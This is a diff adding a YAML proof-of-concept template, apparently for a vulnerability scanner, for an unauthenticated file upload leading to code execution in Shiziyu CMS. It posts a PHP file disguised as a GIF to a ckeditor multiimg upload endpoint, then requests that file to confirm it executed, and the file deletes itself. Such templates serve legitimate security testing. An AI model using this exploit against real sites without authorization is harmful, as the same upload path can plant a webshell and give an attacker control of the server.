@@ -1,0 +1,41 @@
+name: poc-yaml-shiziyu-cms-ckeditor-upload-rce
+manual: true
+transport: http
+set: 
+    p1: randomLowercase(10)
+rules:
+    r1:
+        request:
+            method: POST
+            path: "/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php"
+            headers:
+                # User-Agent: "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+                Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
+            body: |
+                ------WebKitFormBoundary8UaANmWAgM4BqBSs
+                Content-Disposition: form-data; name="files"; filename="test.php"
+                Content-Type: image/gif
+
+                <?php echo "{{p1}}";if($_GET["delete"]=="true"){@unlink(__FILE__);} ?>
+                ------WebKitFormBoundary8UaANmWAgM4BqBSs—
+            follow_redirects: true
+        expression: response.status == 200 && response.body.bcontains(b"php")
+        output:
+            search: |
+                "\"image/uploads/(?P<path>.+?).php\"".bsubmatch(response.raw)
+            path: search["path"]
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: "/Common/image/uploads/{{path}}.php?delete=true"
+            follow_redirects: false
+        expression: |
+            response.status == 200 && response.body.bcontains(bytes(p1))
+
+expression: r1() && r2()
+
+detail:
+  author: ybdt(https://github.com/ybdt)
+  links:
+    - https://www.linuxlz.com/aqld/2251.html
